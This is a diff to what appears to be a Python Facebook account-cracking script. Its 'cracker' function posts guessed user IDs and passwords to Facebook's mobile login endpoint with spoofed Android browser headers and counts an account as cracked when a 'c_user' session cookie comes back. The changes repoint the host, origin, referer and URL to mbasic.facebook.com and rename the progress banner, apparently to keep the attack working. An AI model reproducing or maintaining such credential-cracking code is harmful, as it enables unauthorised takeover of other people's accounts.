@@ -2006,7 +2006,7 @@ def cracker(uid, pwx, tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(NUM) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
         first6digit = uid[0:6]
@@ -2130,7 +2130,7 @@ def cracker(uid, pwx, tl):
     }),
 }
             headers = {
-            'Host': 'mtouch.facebook.com',
+            'Host': 'mbasic.facebook.com',
             # 'content-length': str(len(str(data))), # Content-length is usually set by requests
             'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
@@ -2145,15 +2145,15 @@ def cracker(uid, pwx, tl):
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua-platform': '"Android"',
             'accept': '*/*',
-            'origin': 'https://mtouch.facebook.com',
+            'origin': 'https://mbasic.facebook.com',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://p.facebook.com/async/wbloks/fetch/"
+            url = "https://mbasic.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
